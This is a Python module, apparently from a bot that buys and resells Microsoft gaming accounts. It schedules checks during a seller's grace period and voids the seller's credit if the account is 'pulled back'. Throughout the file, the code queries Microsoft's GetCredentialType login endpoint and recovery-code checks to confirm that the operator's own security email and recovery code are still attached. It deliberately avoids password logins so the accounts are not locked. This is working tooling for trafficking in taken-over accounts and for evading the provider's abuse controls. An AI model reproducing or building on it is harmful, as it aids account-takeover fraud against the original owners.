"""Periodic hold checks for autobuy credits.

Only runs while a credit is still in its pending grace window
(``now < available_at``, usually 12h after submit). Once grace ends the credit
is cleared for withdraw with no further Microsoft probes (minimizes lock risk).

Two independent schedules (grace only):
  • Validity / pullback — every security_email_check_interval_hours (default 2h):
      1) VerifyRecoveryCode only (read-only; never RecoverUser / password login)
      2) If RC invalid or missing → GetCredentialType security-email proof check
  • Lock / suspended — first check at hold_check_interval_hours (default 6h),
    second check hold_check_second_interval_hours later (default 5h50m).
"""

from __future__ import annotations

import json
import logging
from datetime import datetime, timedelta, timezone
from typing import Any

from database.database import DBConnection
from securing.auth.account_status import get_account_lock_reason

logger = logging.getLogger("bot")


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def _parse_ts(value: Any) -> datetime | None:
    if value is None:
        return None
    if isinstance(value, datetime):
        return value if value.tzinfo else value.replace(tzinfo=timezone.utc)
    text = str(value).strip()
    if not text:
        return None
    for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S.%f"):
        try:
            return datetime.strptime(text[:26], fmt).replace(tzinfo=timezone.utc)
        except ValueError:
            continue
    try:
        parsed = datetime.fromisoformat(text.replace("Z", "+00:00"))
        return parsed if parsed.tzinfo else parsed.replace(tzinfo=timezone.utc)
    except ValueError:
        return None


def _fmt_ts(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def _load_domain() -> str:
    try:
        with open("config/config.json", "r") as f:
            return str(json.load(f).get("domain") or "ilovevbucks.site").lower()
    except Exception:
        return "ilovevbucks.site"


def _proof_matches_expected(proof: dict, expected: str) -> bool:
    """Match full or masked MS proof display to our stored security email."""
    expected = (expected or "").strip().lower().replace(r"\u0040", "@")
    if not expected or "@" not in expected:
        return False
    local, _, domain = expected.partition("@")
    display = (
        str(proof.get("display") or proof.get("displayProofName") or "")
        .lower()
        .replace(r"\u0040", "@")
    )
    clear = str(proof.get("clearDigits") or "").lower()

    if display == expected:
        return True
    if "@" not in display:
        return bool(clear) and local.startswith(clear) and domain in display

    d_local, _, d_domain = display.partition("@")
    if d_domain != domain:
        return False
    if "*" in d_local:
        prefix = d_local.split("*", 1)[0]
        if prefix and local.startswith(prefix):
            return True
        if clear and local.startswith(clear):
            return True
        return False
    return d_local == local


def _any_domain_proof(proofs: list, domain: str) -> bool:
    domain = domain.lower()
    for proof in proofs:
        if not isinstance(proof, dict):
            continue
        display = (
            str(proof.get("display") or "")
            .lower()
            .replace(r"\u0040", "@")
        )
        if display.endswith("@" + domain):
            return True
    return False


async def fetch_credential_type(email: str) -> dict | None:
    """Read-only GetCredentialType — never sends an OTP or password.

    Needs a fresh PPFT/flowToken from login.live.com (empty token often omits Credentials).
    """
    try:
        from securing.auth.initial_session import get_session
        from securing.utils.cookies.get_livedata import livedata
        from securing.utils.proxy import close_session
    except Exception:
        get_session = livedata = close_session = None  # type: ignore

    session = None
    try:
        if get_session is None or livedata is None:
            raise RuntimeError("session helpers unavailable")
        session = get_session()
        live = await livedata(session)
        flow = live.get("ppft") or live.get("sFT") or ""
        resp = await session.post(
            url="https://login.live.com/GetCredentialType.srf",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8",
                "Referer": "https://login.live.com/",
            },
            json={
                "checkPhones": True,
                "country": "",
                "federationFlags": 3,
                "flowToken": flow,
                "forceotclogin": False,
                "isCookieBannerShown": True,
                "isExternalFederationDisallowed": True,
                "isFederationDisabled": True,
                "isFidoSupported": False,
                "isOtherIdpSupported": False,
                "isReactLoginRequest": True,
                "isRemoteConnectSupported": False,
                "isRemoteNGCSupported": True,
                "isSignup": False,
                "otclogindisallowed": False,
                "username": email,
            },
        )
        body = resp.text or ""
        if not body.strip():
            logger.warning(
                "GetCredentialType empty for %s status=%s", email, resp.status_code
            )
            return None
        try:
            return resp.json()
        except Exception:
            logger.warning(
                "GetCredentialType non-JSON for %s status=%s snippet=%r",
                email,
                resp.status_code,
                body[:200],
            )
            return None
    except Exception as exc:
        logger.warning(
            "GetCredentialType failed for %s: %s",
            email,
            exc.__class__.__name__,
        )
        return None
    finally:
        if session is not None and close_session is not None:
            try:
                await close_session(session)
            except Exception:
                pass


def _usable_recovery_code(value: str | None) -> str | None:
    rc = (value or "").strip().upper().replace(" ", "")
    if not rc or rc in ("INVALID", "COULDN'T CHANGE!", "COULDNT CHANGE!", "N/A", "UNKNOWN"):
        return None
    # MS recovery codes are 5x5 groups; allow bare 25-char too
    compact = rc.replace("-", "")
    if len(compact) < 20:
        return None
    return rc


async def check_pullback_intact(
    email: str,
    *,
    recovery_code: str | None = None,
    expected_security_email: str | None = None,
    domain: str | None = None,
) -> tuple[str, str | None]:
    """Return (ok|partial|bad|unknown, reason) for hold pullback / validity.

    Same workflow as dashboard Check Validation (no password at any point):
      1) Read-only VerifyRecoveryCode with stored NEW post-secure RC
      2) If RC invalid or missing → security-email GetCredentialType proof match
      3) Never RecoverUser / SubmitRecovery / password login

    Status meaning:
      ok       — recovery code still valid
      partial  — RC invalid/missing but security email still present (do not void)
      bad      — RC invalid/missing AND security email gone/replaced (void)
      unknown  — inconclusive (retry later; do not void)
    """
    rc = _usable_recovery_code(recovery_code)
    rc_bad_reason: str | None = None

    if rc:
        try:
            from securing.utils.security.recovery import check_recovery_code_valid
        except Exception:
            return "unknown", "recovery check helper unavailable"
        status, reason = await check_recovery_code_valid(email, rc)
        if status == "ok":
            return "ok", None
        if status == "unknown":
            return "unknown", reason or "Recovery code check inconclusive"
        # RC bad → fall through to security email (same as dashboard)
        rc_bad_reason = reason or "Stored recovery code no longer valid"
    else:
        rc_bad_reason = "No usable recovery code stored"

    email_status, email_reason = await check_security_email_intact(
        email,
        expected_security_email,
        domain=domain,
    )

    if email_status == "ok":
        return (
            "partial",
            (
                f"RC invalid ({rc_bad_reason}); security email still present"
                if rc
                else "No recovery code; security email still present"
            ),
        )

    if email_status == "unknown":
        return "unknown", email_reason or "Security email check inconclusive"

    return (
        "bad",
        (
            f"RC invalid ({rc_bad_reason}); security email also missing/replaced "
            f"({email_reason})"
        ),
    )


async def check_security_email_intact(
    email: str,
    expected_security_email: str | None,
    *,
    domain: str | None = None,
) -> tuple[str, str | None]:
    """Return (ok|bad|unknown, reason).

    Confirms the sold account still lists our security email on GetCredentialType
    (masked proofs supported). No password login / no OTP.
    Used when recovery code is invalid or not stored.
    """
    email = (email or "").strip()
    if not email:
        return "unknown", "Missing email for security-email check"

    domain = (domain or _load_domain()).lower()
    expected = (expected_security_email or "").strip()
    if expected in ("Couldn't Change!", "Unknown", "N/A"):
        expected = ""

    info = await fetch_credential_type(email)
    if not info:
        return "unknown", "GetCredentialType inconclusive"

    # 0 = Exists, 1 = Not exist (common MS values)
    if_exists = info.get("IfExistsResult")
    if if_exists in (1, "1"):
        return "bad", "Account email no longer exists at Microsoft"

    creds = info.get("Credentials")
    if not isinstance(creds, dict):
        return "unknown", "GetCredentialType missing Credentials"

    proofs = creds.get("OtcLoginEligibleProofs") or []
    if not isinstance(proofs, list):
        proofs = []

    if expected:
        for proof in proofs:
            if isinstance(proof, dict) and _proof_matches_expected(proof, expected):
                return "ok", None
        # Expected proof gone — pullback / security email removed
        if proofs:
            shown = [
                str(p.get("display") or "?")
                for p in proofs
                if isinstance(p, dict)
            ][:5]
            return (
                "bad",
                f"Security email removed or replaced (expected {expected}; saw {shown})",
            )
        return "bad", f"Security email proof missing (expected {expected})"

    # No stored expected — at least require our domain still present
    if _any_domain_proof(proofs, domain):
        return "ok", None
    if proofs:
        return "bad", f"No @{domain} security email on account anymore"
    return "bad", f"No email OTP proofs left (expected @{domain})"


async def check_sold_account(email: str, password: str | None = None) -> tuple[str, str | None]:
    """Lock-only check. Never verifies password (locks / rate-limits accounts)."""
    del password  # intentionally unused — never password-check sold accounts
    if not (email or "").strip():
        return "unknown", "Missing email for lock check"

    try:
        lock_reason = await get_account_lock_reason(email.strip())
    except Exception as exc:
        logger.warning(
            "autobuy lock check inconclusive for %s: %s",
            email,
            exc.__class__.__name__,
        )
        return "unknown", f"Lock check inconclusive ({exc.__class__.__name__})"

    if lock_reason:
        return "bad", lock_reason
    return "ok", None


def _next_after(
    now: datetime,
    hours: float,
    available_at: datetime | None,
) -> datetime:
    nxt = now + timedelta(hours=max(0.25, float(hours)))
    if available_at and nxt > available_at:
        return available_at
    return nxt


async def process_due_hold_checks(
    *,
    security_interval_hours: float = 2.0,
    lock_interval_hours: float = 6.0,
    lock_second_interval_hours: float = 5.0 + 50.0 / 60.0,
    limit: int = 20,
) -> dict:
    """Run due validity/lock checks only while credit is still in grace period.

    After ``available_at`` (pending hours, usually 12h), clears for withdraw
    without further Microsoft probes.

    Lock schedule: first at ``lock_interval_hours`` from sell, then one more
    after ``lock_second_interval_hours`` (default 5h50m), then stop.
    """
    stats = {
        "checked": 0,
        "sec_checked": 0,
        "lock_checked": 0,
        "cleared": 0,
        "voided": 0,
        "rescheduled": 0,
        "skipped": 0,
        "partial": 0,
    }
    void_events: list[dict] = []
    partial_events: list[dict] = []
    with DBConnection() as db:
        due = db.autobuy_credits_due_for_check(limit=limit)

    if not due:
        return {"stats": stats, "void_events": void_events, "partial_events": partial_events}

    # Validity (pullback) defaults to every 2h during grace only
    sec_hours = max(0.25, float(security_interval_hours or 2.0))
    lock_hours = max(1.0, float(lock_interval_hours or 6.0))
    lock_second_hours = max(0.25, float(lock_second_interval_hours or (5.0 + 50.0 / 60.0)))
    now = _utc_now()
    domain = _load_domain()

    for row in due:
        credit_id = int(row["id"])
        email = (row.get("ms_email") or row.get("email") or "").strip()
        expected_sec = (
            (row.get("pullback_security_email") or "").strip()
            or (row.get("ms_security_email") or "").strip()
        )
        # NEW post-secure RC only (credit snapshot or secured_accounts by account_id).
        # Never the seller-submitted recovery code from the sell modal.
        stored_rc = (row.get("pullback_recovery_code") or "").strip()
        rc_source = (row.get("pullback_rc_source") or "none").strip()
        discord_id = int(row["discord_id"])
        remaining = float(row.get("remaining_usd") or 0)
        available_at = _parse_ts(row.get("available_at"))
        next_sec_due = _parse_ts(row.get("next_check_at"))
        next_lock_due = _parse_ts(row.get("next_lock_check_at"))

        # Grace over → clear for withdraw, do NOT probe Microsoft again
        hold_elapsed = available_at is not None and available_at <= now
        if hold_elapsed:
            with DBConnection() as db:
                db.autobuy_mark_credit_checked(
                    credit_id,
                    next_check_at=None,
                    next_lock_check_at=None,
                    clear=True,
                )
            stats["cleared"] += 1
            logger.info(
                "autobuy cleared credit=%s email=%s (grace ended — no further checks)",
                credit_id,
                email or "?",
            )
            continue

        run_sec = next_sec_due is None or next_sec_due <= now
        run_lock = next_lock_due is None or next_lock_due <= now
        # Fresh rows may only have next_check_at set — still run lock on first pass
        # if lock column never scheduled.
        if row.get("next_lock_check_at") is None and not run_lock:
            run_lock = True

        if not email:
            logger.warning("autobuy hold check skip credit=%s — missing email", credit_id)
            with DBConnection() as db:
                db.autobuy_mark_credit_checked(
                    credit_id,
                    next_check_at=_fmt_ts(now + timedelta(hours=min(sec_hours, 2.0))),
                    next_lock_check_at=_fmt_ts(now + timedelta(hours=min(lock_hours, 2.0))),
                )
            stats["skipped"] += 1
            continue

        void_reason: str | None = None
        new_sec_at: str | None = None
        new_lock_at: str | None = None

        if run_sec:
            try:
                status, reason = await check_pullback_intact(
                    email,
                    recovery_code=stored_rc,
                    expected_security_email=expected_sec,
                    domain=domain,
                )
            except Exception:
                logger.exception(
                    "autobuy pullback check crashed credit=%s email=%s",
                    credit_id,
                    email,
                )
                status, reason = "unknown", "pullback check crashed"

            stats["sec_checked"] += 1
            stats["checked"] += 1
            if status == "bad":
                void_reason = reason or "pullback check failed"
            elif status == "unknown":
                new_sec_at = _fmt_ts(now + timedelta(hours=min(1.0, sec_hours)))
            else:
                # ok or partial — keep holding; reschedule validity (default 2h)
                new_sec_at = _fmt_ts(_next_after(now, sec_hours, available_at))
                if status == "partial":
                    stats["partial"] += 1
                    partial_events.append(
                        {
                            "credit_id": credit_id,
                            "discord_id": discord_id,
                            "email": email,
                            "amount_usd": remaining,
                            "detail": reason
                            or "Recovery code invalid; security email still present",
                            "rc_source": rc_source,
                            "available_at": _fmt_ts(available_at) if available_at else None,
                        }
                    )
                logger.info(
                    "autobuy pullback %s credit=%s email=%s rc_source=%s detail=%s",
                    status.upper(),
                    credit_id,
                    email,
                    rc_source,
                    reason or "recovery code valid",
                )

        if void_reason is None and run_lock:
            try:
                status, reason = await check_sold_account(email)
            except Exception:
                logger.exception(
                    "autobuy lock check crashed credit=%s email=%s",
                    credit_id,
                    email,
                )
                status, reason = "unknown", "lock check crashed"

            stats["lock_checked"] += 1
            if not run_sec:
                stats["checked"] += 1
            if status == "bad":
                void_reason = reason or "failed lock check"
            elif status == "unknown":
                new_lock_at = _fmt_ts(now + timedelta(hours=min(1.0, lock_hours)))
            else:
                # After a successful lock check: schedule one more after 5h50m
                # if still inside grace; otherwise park at available_at (no more probes).
                second_at = now + timedelta(hours=lock_second_hours)
                if available_at and second_at < available_at:
                    new_lock_at = _fmt_ts(second_at)
                    logger.info(
                        "autobuy lock OK credit=%s email=%s — next lock in %.2fh",
                        credit_id,
                        email,
                        lock_second_hours,
                    )
                else:
                    new_lock_at = _fmt_ts(available_at) if available_at else None
                    logger.info(
                        "autobuy lock OK credit=%s email=%s — no further lock checks before grace end",
                        credit_id,
                        email,
                    )

        if void_reason:
            with DBConnection() as db:
                voided = db.autobuy_void_credit(credit_id, void_reason)
            if voided > 0:
                stats["voided"] += 1
                void_events.append(
                    {
                        "credit_id": credit_id,
                        "discord_id": discord_id,
                        "email": email,
                        "amount_usd": voided or remaining,
                        "reason": void_reason,
                        "available_at": _fmt_ts(available_at) if available_at else None,
                    }
                )
                logger.warning(
                    "autobuy voided credit=%s email=%s reason=%s amount=$%.2f",
                    credit_id,
                    email,
                    void_reason,
                    voided,
                )
            continue

        # Preserve schedules for checks that did not run this pass
        if new_sec_at is None:
            if next_sec_due and not run_sec:
                new_sec_at = _fmt_ts(next_sec_due)
            else:
                new_sec_at = _fmt_ts(_next_after(now, sec_hours, available_at))
        if new_lock_at is None:
            if next_lock_due and not run_lock:
                new_lock_at = _fmt_ts(next_lock_due)
            else:
                new_lock_at = _fmt_ts(_next_after(now, lock_hours, available_at))

        with DBConnection() as db:
            db.autobuy_mark_credit_checked(
                credit_id,
                next_check_at=new_sec_at,
                next_lock_check_at=new_lock_at,
            )
        stats["rescheduled"] += 1

    return {
        "stats": stats,
        "void_events": void_events,
        "partial_events": partial_events,
    }
